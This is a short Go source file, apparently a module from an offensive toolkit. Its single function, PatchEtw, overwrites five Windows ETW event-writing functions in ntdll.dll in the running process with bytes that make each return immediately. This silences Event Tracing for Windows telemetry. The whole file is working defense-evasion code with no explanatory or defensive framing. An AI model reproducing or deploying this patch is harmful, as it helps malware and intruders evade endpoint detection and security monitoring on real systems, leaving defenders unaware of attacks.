package core

import (
	"encoding/hex"
	"syscall"
	"unsafe"
)

func PatchEtw() error {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	procWriteProcessMemory := syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")

	procEtwEventWrite := ntdll.NewProc("EtwEventWrite")
	procEtwEventWriteEx := ntdll.NewProc("EtwEventWriteEx")
	procEtwEventWriteFull := ntdll.NewProc("EtwEventWriteFull")
	procEtwEventWriteString := ntdll.NewProc("EtwEventWriteString")
	procEtwEventWriteTransfer := ntdll.NewProc("EtwEventWriteTransfer")

	dataAddr := []uintptr{
		procEtwEventWriteFull.Addr(),
		procEtwEventWrite.Addr(),
		procEtwEventWriteEx.Addr(),
		procEtwEventWriteString.Addr(),
		procEtwEventWriteTransfer.Addr(),
	}

	for i := range dataAddr {

		data, _ := hex.DecodeString("4833C0C3")

		procWriteProcessMemory.Call(
			uintptr(0xffffffffffffffff),
			uintptr(dataAddr[i]),
			uintptr(unsafe.Pointer(&data[0])),
			uintptr(len(data)),
			0,
		)
	}

	return nil
}
